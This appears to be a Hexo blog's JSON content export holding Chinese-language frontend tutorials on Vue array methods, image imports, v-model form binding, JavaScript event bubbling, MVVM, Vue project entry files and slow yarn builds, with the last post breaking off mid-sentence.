{"meta":{"title":"山城冰荔枝","subtitle":"","description":"","author":"山城冰荔枝","url":"http://blog.ioimp.top","root":"/"},"pages":[{"title":"404 Not Found：该页无法显示","date":"2023-08-03T12:38:08.372Z","updated":"2023-08-03T12:38:08.372Z","comments":false,"path":"/404.html","permalink":"http://blog.ioimp.top/404.html","excerpt":"","text":""},{"title":"关于","date":"2023-08-03T12:38:08.375Z","updated":"2023-08-03T12:38:08.375Z","comments":false,"path":"about/index.html","permalink":"http://blog.ioimp.top/about/index.html","excerpt":"","text":"个人详细介绍"},{"title":"书单","date":"2023-08-03T12:38:08.376Z","updated":"2023-08-03T12:38:08.376Z","comments":false,"path":"books/index.html","permalink":"http://blog.ioimp.top/books/index.html","excerpt":"","text":""},{"title":"分类","date":"2023-08-03T14:00:34.003Z","updated":"2023-08-03T14:00:34.003Z","comments":true,"path":"categories/index.html","permalink":"http://blog.ioimp.top/categories/index.html","excerpt":"","text":""},{"title":"标签","date":"2023-08-03T12:38:08.380Z","updated":"2023-08-03T12:38:08.380Z","comments":false,"path":"tags/index.html","permalink":"http://blog.ioimp.top/tags/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2023-08-03T12:38:08.378Z","updated":"2023-08-03T12:38:08.378Z","comments":true,"path":"links/index.html","permalink":"http://blog.ioimp.top/links/index.html","excerpt":"","text":""},{"title":"Repositories","date":"2023-08-03T12:38:08.379Z","updated":"2023-08-03T12:38:08.379Z","comments":false,"path":"repository/index.html","permalink":"http://blog.ioimp.top/repository/index.html","excerpt":"","text":""}],"posts":[{"title":"Vue中v-for数组变更方法和数组非变更方法的区别","slug":"Vue中v-for数组变更方法和数组非变更方法的区别","date":"2023-12-23T07:31:31.000Z","updated":"2023-12-23T07:32:52.269Z","comments":true,"path":"2023/12/23/Vue中v-for数组变更方法和数组非变更方法的区别/","link":"","permalink":"http://blog.ioimp.top/2023/12/23/Vue%E4%B8%ADv-for%E6%95%B0%E7%BB%84%E5%8F%98%E6%9B%B4%E6%96%B9%E6%B3%95%E5%92%8C%E6%95%B0%E7%BB%84%E9%9D%9E%E5%8F%98%E6%9B%B4%E6%96%B9%E6%B3%95%E7%9A%84%E5%8C%BA%E5%88%AB/","excerpt":"","text":"v-for数组变更方法和数组非变更方法的区别在Vue中，使用v-for指令可以遍历数组，并根据每个元素生成对应的DOM元素。在操作数组时，我们可以使用两种方法：数组变更方法和数组非变更方法。本文将详细介绍这两种方法的区别和使用场景。 数组变更方法数组变更方法是指直接对原始数组进行修改的方法，如push、pop、shift、unshift、splice、sort和reverse等。这些方法会直接修改原始数组，并触发Vue的更新机制。 123// 示例：使用数组变更方法this.items.push(&#123; name: &#x27;Apple&#x27; &#125;); // 向数组末尾添加一个元素this.items.splice(1, 1, &#123; name: &#x27;Banana&#x27; &#125;); // 替换数组中的一个元素 使用数组变更方法时，Vue能够检测到数组的变化，并自动更新视图。这是因为Vue会对数组变更方法进行代理，拦截这些方法的调用，从而能够捕捉到数组的变化。 数组非变更方法数组非变更方法是指返回一个新数组的方法，而不会修改原始数组的方法，如filter、map、concat和slice等。这些方法不会直接修改原始数组，而是返回一个经过处理的新数组。 123// 示例：使用数组非变更方法const newItems = this.items.filter(item =&gt; item.name !== &#x27;Apple&#x27;); // 过滤数组中的元素const mappedItems = this.items.map(item =&gt; item.name.toUpperCase()); // 对数组中的元素进行映射 使用数组非变更方法时，由于没有直接修改原始数组，Vue无法检测到数组的变化。这意味着，如果我们使用数组非变更方法来处理数组，需要手动更新Vue的视图。 12// 示例：手动更新视图this.items = this.items.filter(item =&gt; item.name !== &#x27;Apple&#x27;); 使用场景 如果我们需要在原始数组上进行增删改操作，并希望Vue自动更新视图，应该使用数组变更方法。 如果我们需要对原始数组进行过滤、映射等操作，并希望得到一个新的数组，可以使用数组非变更方法。但需要注意，在使用数组非变更方法后，需要手动更新Vue的视图。 小结在Vue中，我们可以使用数组变更方法和数组非变更方法来操作数组。数组变更方法会直接修改原始数组，并触发Vue的更新机制；而数组非变更方法会返回一个新数组，需要手动更新Vue的视图。根据具体的需求，选择合适的方法来操作数组。希望本文对你理解数组变更方法和数组非变更方法的区别有所帮助！","categories":[{"name":"前端","slug":"前端","permalink":"http://blog.ioimp.top/categories/%E5%89%8D%E7%AB%AF/"}],"tags":[{"name":"ES6","slug":"ES6","permalink":"http://blog.ioimp.top/tags/ES6/"},{"name":"前端学习","slug":"前端学习","permalink":"http://blog.ioimp.top/tags/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/"},{"name":"Vue基础","slug":"Vue基础","permalink":"http://blog.ioimp.top/tags/Vue%E5%9F%BA%E7%A1%80/"}]},{"title":"Vue中js引入图片的方法","slug":"Vue中js引入图片的方法","date":"2023-12-23T07:13:23.000Z","updated":"2023-12-23T07:14:43.975Z","comments":true,"path":"2023/12/23/Vue中js引入图片的方法/","link":"","permalink":"http://blog.ioimp.top/2023/12/23/Vue%E4%B8%ADjs%E5%BC%95%E5%85%A5%E5%9B%BE%E7%89%87%E7%9A%84%E6%96%B9%E6%B3%95/","excerpt":"","text":"在Vue项目中，我们经常需要在页面中引入图片。本文将介绍在Vue中引入图片的几种方法。 1. 直接使用img标签最简单的方法是直接使用HTML的img标签来引入图片。在Vue的模板中，我们可以使用以下方式引入图片： 1&lt;img src=&quot;@/assets/image.png&quot; alt=&quot;图片&quot;&gt; 其中，@/是Vue CLI中默认配置的别名，指向src目录。assets是存放静态资源的目录，可以根据实际项目结构进行调整。 2. 使用require引入图片在Vue中，我们可以使用require函数来引入图片。在Vue的模板中，我们可以使用以下方式引入图片： 1&lt;img :src=&quot;require(&#x27;@/assets/image.png&#x27;)&quot; alt=&quot;图片&quot;&gt; 注意，这里使用了Vue的动态绑定语法:src，使得图片路径可以根据实际需要进行动态改变。 3. 使用import引入图片在Vue的组件中，我们也可以使用ES6的import语法来引入图片。在Vue的组件中，我们可以使用以下方式引入图片： 123456789import image from &#x27;@/assets/image.png&#x27;;export default &#123; data() &#123; return &#123; imgSrc: image &#125;; &#125;&#125; 然后，在模板中使用动态绑定语法来显示图片： 1&lt;img :src=&quot;imgSrc&quot; alt=&quot;图片&quot;&gt; 这样，我们就可以通过import来引入图片，并将其赋值给组件的data属性，然后在模板中使用。 4. 使用CSS引入图片在Vue中，我们也可以使用CSS的background-image属性来引入图片。在Vue的组件的样式中，我们可以使用以下方式引入图片： 123.image &#123; background-image: url(&quot;@/assets/image.png&quot;);&#125; 然后，在模板中使用该样式类： 1&lt;div class=&quot;image&quot;&gt;&lt;/div&gt; 这样，我们就可以通过CSS的方式来引入图片。 总结本文介绍了在Vue中引入图片的几种方法：直接使用img标签、使用require引入图片、使用import引入图片和使用CSS引入图片。根据实际项目的需求，可以选择适合的方法来引入图片。","categories":[{"name":"前端","slug":"前端","permalink":"http://blog.ioimp.top/categories/%E5%89%8D%E7%AB%AF/"}],"tags":[{"name":"ES6","slug":"ES6","permalink":"http://blog.ioimp.top/tags/ES6/"},{"name":"前端学习","slug":"前端学习","permalink":"http://blog.ioimp.top/tags/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/"},{"name":"Vue基础","slug":"Vue基础","permalink":"http://blog.ioimp.top/tags/Vue%E5%9F%BA%E7%A1%80/"}]},{"title":"Vue中v-model对应不同的表单标签的处理方式","slug":"Vue中v-model对应不同的表单标签的处理方式","date":"2023-12-23T03:15:27.000Z","updated":"2023-12-23T07:14:40.830Z","comments":true,"path":"2023/12/23/Vue中v-model对应不同的表单标签的处理方式/","link":"","permalink":"http://blog.ioimp.top/2023/12/23/Vue%E4%B8%ADv-model%E5%AF%B9%E5%BA%94%E4%B8%8D%E5%90%8C%E7%9A%84%E8%A1%A8%E5%8D%95%E6%A0%87%E7%AD%BE%E7%9A%84%E5%A4%84%E7%90%86%E6%96%B9%E5%BC%8F/","excerpt":"","text":"在Vue中，v-model是一个常用的指令，用于实现表单元素与Vue实例数据的双向绑定。通过v-model指令，我们可以轻松地将表单的输入值与Vue实例中的数据进行同步。 基本用法v-model指令可以用于不同类型的表单元素，包括输入框、复选框、单选框、下拉框等。下面是v-model的基本用法： 12345678910111213141516&lt;template&gt; &lt;div&gt; &lt;input v-model=&quot;message&quot; type=&quot;text&quot;&gt; &lt;p&gt;&#123;&#123; message &#125;&#125;&lt;/p&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123; data() &#123; return &#123; message: &quot;&quot; &#125;; &#125;&#125;;&lt;/script&gt; 在上面的例子中，我们创建了一个输入框，并通过v-model指令将输入框的值与Vue实例中的message数据进行绑定。当用户在输入框中输入内容时，message数据会自动更新，同时页面上的p标签中也会显示出输入框的值。 绑定不同类型的表单标签输入框对于输入框，v-model会将输入的值作为数据进行绑定。例如，我们可以将输入框的值绑定到一个字符串类型的数据： 12345678910111213141516&lt;template&gt; &lt;div&gt; &lt;input v-model=&quot;message&quot; type=&quot;text&quot;&gt; &lt;p&gt;&#123;&#123; message &#125;&#125;&lt;/p&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123; data() &#123; return &#123; message: &quot;&quot; &#125;; &#125;&#125;;&lt;/script&gt; 复选框对于复选框，v-model会将选中状态作为数据进行绑定。例如，我们可以将复选框的选中状态绑定到一个布尔类型的数据： 复选框在使用v-model时，可以绑定到不同类型的变量上，主要区分为布尔型和数组型。 布尔型（Boolean）当复选框绑定到布尔型变量时，选中和未选中状态将直接映射到布尔值true和false。 12345678910111213141516&lt;template&gt; &lt;div&gt; &lt;input v-model=&quot;isChecked&quot; type=&quot;checkbox&quot;&gt; &lt;p&gt;复选框选中状态：&#123;&#123; isChecked &#125;&#125;&lt;/p&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123; data() &#123; return &#123; isChecked: false &#125;; &#125;&#125;;&lt;/script&gt; 在上面的例子中，isChecked是一个布尔型变量，当复选框被选中时，isChecked变为true，反之为false。 数组型（Array）当复选框绑定到数组型变量时，选中的复选框的value值会被添加到数组中，未选中的则会从数组中移除。 123456789101112131415161718&lt;template&gt; &lt;div&gt; &lt;input v-model=&quot;selectedItems&quot; type=&quot;checkbox&quot; value=&quot;Item1&quot;&gt; &lt;input v-model=&quot;selectedItems&quot; type=&quot;checkbox&quot; value=&quot;Item2&quot;&gt; &lt;input v-model=&quot;selectedItems&quot; type=&quot;checkbox&quot; value=&quot;Item3&quot;&gt; &lt;p&gt;选中的项目：&#123;&#123; selectedItems &#125;&#125;&lt;/p&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123; data() &#123; return &#123; selectedItems: [] &#125;; &#125;&#125;;&lt;/script&gt; 字符串类型123456789101112131415161718&lt;template&gt; &lt;div&gt; &lt;input v-model=&quot;selectedItems&quot; type=&quot;checkbox&quot; value=&quot;Item1&quot;&gt; &lt;input v-model=&quot;selectedItems&quot; type=&quot;checkbox&quot; value=&quot;Item2&quot;&gt; &lt;input v-model=&quot;selectedItems&quot; type=&quot;checkbox&quot; value=&quot;Item3&quot;&gt; &lt;p&gt;选中的项目：&#123;&#123; selectedItems &#125;&#125;&lt;/p&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123; data() &#123; return &#123; selectedItems: &quot;&quot; &#125;; &#125;&#125;;&lt;/script&gt; 如果变量是字符串类型则所有的复选框都会被选中 在上面的例子中，selectedItems是一个数组型变量，当用户选中任意一个复选框时，对应的value值（例如”Item1”）会被添加到selectedItems数组中。如果用户取消选中，该值则会从数组中移除。 总结 当复选框绑定到布尔型变量时，其用于表示单个复选框的选中状态。 当复选框绑定到数组型变量时，用于表示多个复选框中被选中的项，并以数组的形式存储所有选中项的value值。 使用哪种类型主要取决于具体的应用场景和需求。如果只需要控制单个复选框的选中状态，通常使用布尔型变量。而如果需要处理多选的情况，比如表单中的多项选择题，使用数组型变量会更加方便。 单选框对于单选框，v-model会将选中的值作为数据进行绑定。例如，我们可以将单选框的选中值绑定到一个字符串类型的数据： 1234567891011121314151617&lt;template&gt; &lt;div&gt; &lt;input v-model=&quot;selected&quot; type=&quot;radio&quot; value=&quot;A&quot;&gt; &lt;input v-model=&quot;selected&quot; type=&quot;radio&quot; value=&quot;B&quot;&gt; &lt;p&gt;&#123;&#123; selected &#125;&#125;&lt;/p&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123; data() &#123; return &#123; selected: &quot;&quot; &#125;; &#125;&#125;;&lt;/script&gt; 下拉框对于下拉框，v-model会将选中的值作为数据进行绑定。例如，我们可以将下拉框的选中值绑定到一个字符串类型的数据： 12345678910111213141516171819&lt;template&gt; &lt;div&gt; &lt;select v-model=&quot;selected&quot;&gt; &lt;option value=&quot;A&quot;&gt;Option A&lt;/option&gt; &lt;option value=&quot;B&quot;&gt;Option B&lt;/option&gt; &lt;/select&gt; &lt;p&gt;&#123;&#123; selected &#125;&#125;&lt;/p&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123; data() &#123; return &#123; selected: &quot;&quot; &#125;; &#125;&#125;;&lt;/script&gt; 总结通过v-model指令，我们可以轻松地实现表单元素与Vue实例数据的双向绑定。无论是输入框、复选框、单选框还是下拉框，都可以通过v-model指令来实现数据的同步更新。这大大简化了表单操作的代码量，并提高了开发效率。 以上是v-model的基础使用和绑定不同类型的表单标签的方式，希望对你有所帮助！","categories":[{"name":"前端","slug":"前端","permalink":"http://blog.ioimp.top/categories/%E5%89%8D%E7%AB%AF/"}],"tags":[{"name":"ES6","slug":"ES6","permalink":"http://blog.ioimp.top/tags/ES6/"},{"name":"前端学习","slug":"前端学习","permalink":"http://blog.ioimp.top/tags/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/"},{"name":"Vue基础","slug":"Vue基础","permalink":"http://blog.ioimp.top/tags/Vue%E5%9F%BA%E7%A1%80/"}]},{"title":"JS中什么是事件冒泡","slug":"JS中什么是事件冒泡","date":"2023-12-22T16:33:50.000Z","updated":"2023-12-23T07:14:37.397Z","comments":true,"path":"2023/12/23/JS中什么是事件冒泡/","link":"","permalink":"http://blog.ioimp.top/2023/12/23/JS%E4%B8%AD%E4%BB%80%E4%B9%88%E6%98%AF%E4%BA%8B%E4%BB%B6%E5%86%92%E6%B3%A1/","excerpt":"","text":"事件冒泡在JavaScript中，事件冒泡是指当一个元素上的事件被触发时，事件会从该元素开始向上冒泡至其父元素，直到最顶层的父元素。这种冒泡的行为可以让我们在处理事件时更加方便和灵活。 事件冒泡的原理事件冒泡的原理是基于DOM树的结构。在一个典型的HTML页面中，元素之间存在嵌套关系，父元素包含子元素，子元素包含孙元素，以此类推。当一个元素上发生了某个事件（比如点击事件），浏览器会首先触发该元素上的事件处理程序，然后再触发其父元素上的事件处理程序，直到最顶层的父元素。 事件冒泡的应用事件冒泡在JavaScript中有着广泛的应用。通过使用事件冒泡，我们可以方便地为多个元素添加相同的事件处理程序，而不需要分别为每个元素添加。这样可以大大简化代码并提高代码的可维护性。 另外，事件冒泡还可以实现事件委托。事件委托是指将事件处理程序绑定在父元素上，然后通过事件冒泡的机制来触发处理程序。这种方式可以减少事件处理程序的数量，从而提高性能。例如，我们可以将点击事件处理程序绑定在一个父元素上，然后通过事件冒泡来判断具体是哪个子元素被点击了，从而执行相应的操作。 如何阻止事件冒泡有时候我们希望阻止事件冒泡，即在某个元素上触发事件后，不再向上冒泡至其父元素。在JavaScript中，可以通过调用事件对象的stopPropagation()方法来实现。这样可以在事件处理程序中使用event.stopPropagation()来阻止事件冒泡。 总结事件冒泡是JavaScript中的一种重要的事件机制，可以使我们更加方便地处理事件。通过了解事件冒泡的原理和应用，我们可以更好地运用它来编写高效的JavaScript代码。 示例12345678910111213141516171819202122232425262728293031323334&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;事件冒泡示例&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=&quot;parent&quot;&gt; &lt;div id=&quot;child&quot;&gt; &lt;button id=&quot;button&quot;&gt;点击我&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; &lt;script&gt; // 获取父元素、子元素和按钮元素 var parent = document.getElementById(&#x27;parent&#x27;); var child = document.getElementById(&#x27;child&#x27;); var button = document.getElementById(&#x27;button&#x27;); // 为父元素、子元素和按钮元素添加点击事件处理程序 parent.addEventListener(&#x27;click&#x27;, function() &#123; console.log(&#x27;父元素被点击&#x27;); &#125;); child.addEventListener(&#x27;click&#x27;, function() &#123; console.log(&#x27;子元素被点击&#x27;); &#125;); button.addEventListener(&#x27;click&#x27;, function(event) &#123; event.stopPropagation(); // 阻止事件冒泡 console.log(&#x27;按钮被点击&#x27;); &#125;); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 在上述示例代码中，我们创建了一个父元素parent、一个子元素child和一个按钮元素button。我们为这三个元素分别添加了点击事件处理程序。 当点击按钮时，点击事件会首先触发按钮元素上的事件处理程序，然后再冒泡至子元素和父元素。但是由于我们在按钮元素的事件处理程序中调用了event.stopPropagation()方法，所以事件冒泡会在按钮元素处被阻止，不再向上冒泡至子元素和父元素。因此，只会在控制台输出”按钮被点击”，而不会输出”子元素被点击”和”父元素被点击”。 这个示例展示了如何使用事件冒泡和阻止事件冒泡来处理事件。希望本篇博客对你理解事件冒泡有所帮助！","categories":[{"name":"前端","slug":"前端","permalink":"http://blog.ioimp.top/categories/%E5%89%8D%E7%AB%AF/"}],"tags":[{"name":"ES6","slug":"ES6","permalink":"http://blog.ioimp.top/tags/ES6/"},{"name":"前端学习","slug":"前端学习","permalink":"http://blog.ioimp.top/tags/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/"},{"name":"Vue基础","slug":"Vue基础","permalink":"http://blog.ioimp.top/tags/Vue%E5%9F%BA%E7%A1%80/"},{"name":"JavaScript","slug":"JavaScript","permalink":"http://blog.ioimp.top/tags/JavaScript/"}]},{"title":"MVVM设计模式","slug":"MVVM设计模式","date":"2023-12-22T16:19:02.000Z","updated":"2023-12-22T16:47:28.419Z","comments":true,"path":"2023/12/23/MVVM设计模式/","link":"","permalink":"http://blog.ioimp.top/2023/12/23/MVVM%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/","excerpt":"","text":"什么是MVVM设计模式MVVM是一种软件架构设计模式，它将应用程序的用户界面(UI)、业务逻辑和数据模型分离开来。MVVM的全称是Model-View-ViewModel，它的核心思想是将视图(View)和模型(Model)之间的依赖关系解耦，通过ViewModel来进行数据的交互和控制。 Model：模型层，负责数据的访问和处理。它通常包含了数据模型、数据访问层和业务逻辑等。 View：视图层，负责展示数据并与用户进行交互。它通常包含了用户界面和用户交互逻辑等。 ViewModel：视图模型层，负责将模型层的数据转化为视图层可用的数据，并处理视图层的用户交互逻辑。它通常包含了数据绑定、命令绑定和业务逻辑等。 MVVM的优势MVVM设计模式的优势在于它能够提高代码的可维护性、可测试性和可扩展性。 可维护性：由于视图和模型之间的解耦，开发人员可以更容易地对视图和模型进行独立的修改和维护，而不会对其他部分产生影响。 可测试性：由于ViewModel负责处理业务逻辑，开发人员可以更容易地编写针对ViewModel的单元测试，而不需要依赖于具体的视图。 可扩展性：由于视图和模型之间的解耦，开发人员可以更容易地对视图和模型进行扩展，而不会对其他部分产生影响。 MVVM的实现方式MVVM的实现方式有多种，下面以一个简单的示例来介绍其中一种实现方式。 1. 创建模型(Model)首先，我们需要创建一个模型类来表示我们的数据。比如，我们创建一个User模型类，用于表示用户的信息。 123456class User &#123; constructor(name, age) &#123; this.name = name; this.age = age; &#125;&#125; 2. 创建视图(View)接下来，我们需要创建一个视图组件来展示用户的信息，并与用户进行交互。比如，我们创建一个UserView组件，用于展示用户的姓名和年龄，并提供一个按钮用于修改用户的信息。 1234567891011121314151617181920212223242526272829&lt;template&gt; &lt;div&gt; &lt;p&gt;&#123;&#123; name &#125;&#125;&lt;/p&gt; &lt;p&gt;&#123;&#123; age &#125;&#125;&lt;/p&gt; &lt;button @click=&quot;update&quot;&gt;修改&lt;/button&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123; props: &#123; user: &#123; type: Object, required: true &#125; &#125;, data() &#123; return &#123; name: this.user.name, age: this.user.age &#125;; &#125;, methods: &#123; update() &#123; // 处理修改按钮的点击事件 &#125; &#125;&#125;;&lt;/script&gt; 3. 创建视图模型(ViewModel)然后，我们需要创建一个视图模型类来将模型的数据转化为视图可用的数据，并处理视图的用户交互逻辑。比如，我们创建一个UserViewModel视图模型类，用于将User模型的数据转化为UserView组件可用的数据，并处理修改按钮的点击事件。 12345678910111213141516171819202122232425class UserViewModel &#123; constructor(user) &#123; this.user = user; &#125; get name() &#123; return this.user.name; &#125; set name(value) &#123; this.user.name = value; &#125; get age() &#123; return this.user.age; &#125; set age(value) &#123; this.user.age = value; &#125; update() &#123; // 处理修改按钮的点击事件 &#125;&#125; 4. 绑定视图(View)和视图模型(ViewModel)最后，我们需要在视图中绑定视图模型，以实现数据的双向绑定和用户交互的命令绑定。比如，我们可以在父组件中引入UserView组件，并将UserViewModel实例作为props传递给UserView组件。 123456789101112131415161718192021&lt;template&gt; &lt;div&gt; &lt;user-view :user=&quot;userViewModel&quot;&gt;&lt;/user-view&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;import UserView from &#x27;./UserView.vue&#x27;;import User from &#x27;./User.js&#x27;;export default &#123; components: &#123; UserView &#125;, data() &#123; return &#123; userViewModel: new UserViewModel(new User(&#x27;John Doe&#x27;, 25)) &#125;; &#125;&#125;;&lt;/script&gt; 总结MVVM设计模式通过将视图(View)和模型(Model)之间的依赖关系解耦，提高了代码的可维护性、可测试性和可扩展性。通过创建视图模型(ViewModel)来处理数据的转化和用户交互逻辑，实现了视图(View)和模型(Model)之间的解耦。同时，通过数据绑定和命令绑定，实现了视图(View)和视图模型(ViewModel)之间的双向通信。","categories":[{"name":"前端","slug":"前端","permalink":"http://blog.ioimp.top/categories/%E5%89%8D%E7%AB%AF/"}],"tags":[{"name":"ES6","slug":"ES6","permalink":"http://blog.ioimp.top/tags/ES6/"},{"name":"前端学习","slug":"前端学习","permalink":"http://blog.ioimp.top/tags/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/"},{"name":"Vue基础","slug":"Vue基础","permalink":"http://blog.ioimp.top/tags/Vue%E5%9F%BA%E7%A1%80/"}]},{"title":"Vue中 main.js, APP.vue和 index.html 的作用和关系","slug":"Vue中-main-js-APP-vue和-index-html-的作用和关系","date":"2023-12-22T15:47:51.000Z","updated":"2023-12-22T15:50:05.839Z","comments":true,"path":"2023/12/22/Vue中-main-js-APP-vue和-index-html-的作用和关系/","link":"","permalink":"http://blog.ioimp.top/2023/12/22/Vue%E4%B8%AD-main-js-APP-vue%E5%92%8C-index-html-%E7%9A%84%E4%BD%9C%E7%94%A8%E5%92%8C%E5%85%B3%E7%B3%BB/","excerpt":"","text":"在Vue中，main.js、APP.vue和index.html是三个核心文件，它们在Vue项目中扮演着不同的角色和功能。 index.htmlindex.html是Vue项目的入口文件。它是一个HTML文件，包含了整个应用的骨架。在index.html中，我们可以定义应用的标题、引入CSS和JavaScript文件，以及提供一个容器元素（通常是一个div元素），用于挂载Vue实例。 1234567891011&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;My Vue App&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;styles.css&quot;&gt; &lt;script src=&quot;main.js&quot;&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=&quot;app&quot;&gt;&lt;/div&gt; &lt;/body&gt;&lt;/html&gt; main.jsmain.js是Vue应用的入口文件。它是一个JavaScript文件，用于创建和配置Vue实例。在main.js中，我们可以引入Vue库，创建Vue实例，并将其挂载到index.html中的容器元素上。 123456import Vue from &#x27;vue&#x27;import App from &#x27;./App.vue&#x27;new Vue(&#123; render: h =&gt; h(App),&#125;).$mount(&#x27;#app&#x27;) 在上面的代码中，我们首先引入了Vue库和App.vue组件。然后，创建了一个Vue实例，并使用render函数渲染App组件。最后，使用$mount方法将Vue实例挂载到id为”app”的元素上。 App.vueApp.vue是Vue应用的根组件。它是一个单文件组件，包含了应用的整体布局和逻辑。在App.vue中，我们可以定义应用的顶级路由、导航栏、侧边栏等组件。同时，App.vue也可以包含其他子组件，用于构建整个应用的页面结构。 12345678910111213141516171819202122&lt;template&gt; &lt;div&gt; &lt;header&gt; &lt;h1&gt;My Vue App&lt;/h1&gt; &lt;nav&gt; &lt;router-link to=&quot;/&quot;&gt;Home&lt;/router-link&gt; &lt;router-link to=&quot;/about&quot;&gt;About&lt;/router-link&gt; &lt;/nav&gt; &lt;/header&gt; &lt;router-view&gt;&lt;/router-view&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123; name: &#x27;App&#x27;,&#125;&lt;/script&gt;&lt;style&gt;/* 样式定义 */&lt;/style&gt; 在上面的代码中，我们定义了一个顶级的div元素，包含了一个header元素和一个router-view元素。header元素用于显示应用的标题和导航栏，router-view元素用于渲染当前路由对应的组件。 关系这三个文件之间的关系如下： index.html是整个应用的入口文件，它引入了main.js和App.vue。 main.js是Vue应用的入口文件，它创建了Vue实例并将其挂载到index.html中的容器元素上。 App.vue是Vue应用的根组件，它包含了应用的整体布局和逻辑。在main.js中，我们使用import语句引入了App.vue，并在Vue实例的配置中使用了App组件。 综上所述，index.html提供了应用的骨架，main.js创建了Vue实例并将其挂载到index.html中的容器元素上，而App.vue定义了整个应用的布局和逻辑。通过这三个文件的协作，我们可以构建出一个完整的Vue应用。","categories":[{"name":"前端","slug":"前端","permalink":"http://blog.ioimp.top/categories/%E5%89%8D%E7%AB%AF/"}],"tags":[{"name":"ES6","slug":"ES6","permalink":"http://blog.ioimp.top/tags/ES6/"},{"name":"前端学习","slug":"前端学习","permalink":"http://blog.ioimp.top/tags/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/"},{"name":"Vue基础","slug":"Vue基础","permalink":"http://blog.ioimp.top/tags/Vue%E5%9F%BA%E7%A1%80/"}]},{"title":"为什么 yarn build 命令非常耗时","slug":"为什么-yarn-build命令非常耗时","date":"2023-12-22T08:31:23.000Z","updated":"2023-12-22T09:27:44.484Z","comments":true,"path":"2023/12/22/为什么-yarn-build命令非常耗时/","link":"","permalink":"http://blog.ioimp.top/2023/12/22/%E4%B8%BA%E4%BB%80%E4%B9%88-yarn-build%E5%91%BD%E4%BB%A4%E9%9D%9E%E5%B8%B8%E8%80%97%E6%97%B6/","excerpt":"","text":"在开发过程中，我们经常使用构建工具来编译、打包和优化我们的代码。而在前端开发中，yarn build 命令是常用的构建命令之一。然而，你可能会注意到，yarn build 命令有时候会非常耗时，特别是在项目变得庞大复杂时。那么，为什么 yarn build 命令会如此耗时呢？本篇博客将对此进行探讨。 1. 代码量的增加随着项目的发展，代码量也会逐渐增加。更多的代码需要被编译、转换、打包和优化，这必然会增加构建的时间。尤其是在处理大量文件时，构建工具需要遍历每一个文件并进行处理，这将会消耗大量的时间。 2. 依赖项的增多在现代的前端开发中，我们通常依赖于许多第三方库和工具。这些依赖项可能有自己的构建过程，当我们执行 yarn build 命令时，构建工具需要先编译和打包这些依赖项，然后再处理我们自己的代码。因此，依赖项的增多也会导致构建时间的增加。 3. 文件读取和加载在构建过程中，构建工具需要从磁盘读取对应的文件到内存中进行处理。这个过程涉及到磁盘的读取速度和文件的大小。如果项目中有大量的文件或者文件很大，那么读取和加载的时间将会增加。 4. 代码处理和转换一旦文件被加载到内存中，构建工具开始根据配置使用对应的 loader 对代码进行处理和转换。例如，对于 JavaScript 文件，可能会使用 Babel 进行转换；对于 CSS 文件，可能会使用 PostCSS 进行处理。这个处理和转换的过程可能会涉及到复杂的算法和逻辑，因此会耗费一定的时间。 5. 输出到磁盘在代码处理和转换完成后，构建工具会将处理完的内容输出到磁盘的指定目录。这个过程也需要写入磁盘的速度和文件的大小。如果输出的文件很多或者文件很大，那么写入磁盘的时间将会增加。 6. 优化和压缩过程在构建过程中，我们通常会对代码进行优化和压缩，以提高性能和减少文件大小。这些优化和压缩过程可能需要较长的时间，特别是在处理大型项目时。例如，压缩和混淆 JavaScript 代码、优化 CSS 样式、压缩图片等都需要一定的时间。 7. 硬件性能限制在一些较老或配置较低的计算机上，构建过程可能会更加耗时。较慢的处理器、较少的内存和较慢的硬盘都会对构建时间产生影响。因此，如果你的计算机性能较低，那么构建时间可能会更长。 8. 构建过程的优化尽管 yarn build 命令可能会耗时，但我们仍然可以采取一些措施来优化构建过程，以减少构建时间。以下是一些常见的优化方法： 使用增量构建：只重新构建修改过的文件，而不是整个项目。 使用缓存：将构建过程中生成的中间文件缓存起来，以便下次构建时能够复用。 并行处理：将构建过程中的任务并行执行，以提高整体的构建速度。 优化配置文件：检查构建工具的配置文件，确保其使用了最佳的配置选项。 总结起来，yarn build 命令耗时的原因有很多，包括代码量的增加、依赖项的增多、文件读取和加载、代码处理和转换、输出到磁盘、优化和压缩过程、硬件性能限制等。然而，我们可以通过优化构建过程和硬件环境，来减少构建时间，提高开发效率。希望本篇博客能够对你理解 yarn build 